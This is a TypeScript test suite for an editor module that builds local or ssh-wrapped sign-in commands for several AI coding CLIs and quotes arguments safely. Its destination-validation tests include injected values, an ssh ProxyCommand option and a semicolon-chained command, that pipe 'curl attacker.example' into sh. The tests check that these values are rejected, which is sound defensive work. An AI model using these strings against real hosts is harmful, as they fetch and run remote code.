/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { buildSignInLaunch, formatSignInCommand, loginCommandForCli, quotePosixArg, SignInLaunchResult } from '../../common/wispSignIn.js';

function ok(result: SignInLaunchResult) {
	assert.strictEqual(result.kind, 'ok');
	return (result as Extract<SignInLaunchResult, { kind: 'ok' }>).launch;
}

suite('wispSignIn', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	suite('loginCommandForCli', () => {

		test('claude is the same locally and remotely', () => {
			assert.deepStrictEqual(loginCommandForCli('claude', false), { executable: 'claude', args: ['auth', 'login'] });
			assert.deepStrictEqual(loginCommandForCli('claude', true), { executable: 'claude', args: ['auth', 'login'] });
		});

		test('codex adds --device-auth only on a remote host', () => {
			assert.deepStrictEqual(loginCommandForCli('codex', false), { executable: 'codex', args: ['login'] });
			assert.deepStrictEqual(loginCommandForCli('codex', true), { executable: 'codex', args: ['login', '--device-auth'] });
		});

		test('cursor sets NO_OPEN_BROWSER only on a remote host', () => {
			assert.deepStrictEqual(loginCommandForCli('cursor', false), { executable: 'agent', args: ['login'] });
			assert.deepStrictEqual(loginCommandForCli('cursor', true), { executable: 'agent', args: ['login'], env: { NO_OPEN_BROWSER: '1' } });
		});
	});

	suite('buildSignInLaunch: local', () => {

		test('local (the default) runs the CLI directly, with no ssh involved', () => {
			assert.deepStrictEqual(ok(buildSignInLaunch('claude', 'local')), { executable: 'claude', args: ['auth', 'login'] });
		});

		test('an empty host string counts as local, matching wisp.host\'s own default', () => {
			assert.deepStrictEqual(ok(buildSignInLaunch('codex', '')), { executable: 'codex', args: ['login'] });
		});
	});

	suite('buildSignInLaunch: remote', () => {

		test('runs ssh -t -- <destination> <cli> <login args>, as separate argv entries', () => {
			assert.deepStrictEqual(ok(buildSignInLaunch('claude', 'mac-mini')), {
				executable: 'ssh',
				args: ['-t', '--', 'mac-mini', 'claude', 'auth', 'login'],
			});
		});

		test('codex remote adds --device-auth inside the ssh argv', () => {
			assert.deepStrictEqual(ok(buildSignInLaunch('codex', 'mac-mini')), {
				executable: 'ssh',
				args: ['-t', '--', 'mac-mini', 'codex', 'login', '--device-auth'],
			});
		});

		test('cursor remote sets NO_OPEN_BROWSER through an env argv prefix, not a shell assignment', () => {
			assert.deepStrictEqual(ok(buildSignInLaunch('cursor', 'mac-mini')), {
				executable: 'ssh',
				args: ['-t', '--', 'mac-mini', 'env', 'NO_OPEN_BROWSER=1', 'agent', 'login'],
			});
		});

		test('trims a destination with surrounding whitespace before building argv', () => {
			assert.deepStrictEqual(ok(buildSignInLaunch('claude', '  mac-mini  ')), {
				executable: 'ssh',
				args: ['-t', '--', 'mac-mini', 'claude', 'auth', 'login'],
			});
		});
	});

	suite('buildSignInLaunch: destination validation (#64\'s validateSshDestination)', () => {

		test('rejects a destination that could be read as an ssh option', () => {
			const result = buildSignInLaunch('claude', '-oProxyCommand=curl attacker.example|sh');
			assert.strictEqual(result.kind, 'error');
			assert.match((result as Extract<SignInLaunchResult, { kind: 'error' }>).message, /option/);
		});

		test('rejects a destination containing whitespace', () => {
			const result = buildSignInLaunch('claude', 'mac mini');
			assert.strictEqual(result.kind, 'error');
		});

		test('rejects a destination containing a shell metacharacter', () => {
			const result = buildSignInLaunch('claude', 'mac-mini;curl attacker.example|sh');
			assert.strictEqual(result.kind, 'error');
		});

		test('never builds ssh argv for an invalid destination', () => {
			const result = buildSignInLaunch('claude', '-oProxyCommand=x');
			assert.strictEqual(result.kind, 'error');
		});
	});

	suite('quotePosixArg and formatSignInCommand', () => {

		test('leaves plain, already-safe tokens unquoted', () => {
			assert.strictEqual(quotePosixArg('claude'), 'claude');
			assert.strictEqual(quotePosixArg('--device-auth'), '--device-auth');
			assert.strictEqual(quotePosixArg('NO_OPEN_BROWSER=1'), 'NO_OPEN_BROWSER=1');
			assert.strictEqual(quotePosixArg('mac-mini.local'), 'mac-mini.local');
		});

		test('single-quotes a token containing whitespace', () => {
			assert.strictEqual(quotePosixArg('a b'), "'a b'");
		});

		test('escapes an embedded single quote with the standard POSIX idiom', () => {
			assert.strictEqual(quotePosixArg("it's"), "'it'\\''s'");
		});

		test('quotes the empty string', () => {
			assert.strictEqual(quotePosixArg(''), "''");
		});

		test('formats a whole launch as one safely-quoted line', () => {
			const line = formatSignInCommand({ executable: 'ssh', args: ['-t', '--', 'mac mini', 'claude', 'auth', 'login'] });
			assert.strictEqual(line, "ssh -t -- 'mac mini' claude auth login");
		});
	});
});
